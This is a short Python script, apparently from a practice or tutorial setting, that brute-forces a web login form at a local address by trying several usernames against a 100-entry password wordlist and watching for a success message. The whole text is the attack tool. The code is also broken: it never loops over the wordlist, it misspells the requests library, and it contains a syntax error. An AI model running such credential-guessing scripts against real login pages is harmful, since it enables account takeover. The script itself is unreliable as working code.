import requests
import sys # to make our own progress bar

target = "http://127.0.0.1:5000" # target
usernames = ["admin", "user", "test"] # list of usernames
passwords = "top-100.txt" # wordlist
needle = "welcome back" # what it displays upon success

for username in usernames:
	with open(passwords, "r") as password_list:
		password = password.strip("\n").encode()
		sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password.decode()))
		sys.stdout.flush()
		r = request.post(target, data={"username": username, "password": password})
		if needle.encode() in r.content:
			sys.stdout.write("\n")
			sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(password.decode(). username))
			sys.exit()
		sys.stdout.flush()
		sys.stdout.write("\n")
		sys.stdout.write("\nNo password found '{}'!".format(username))
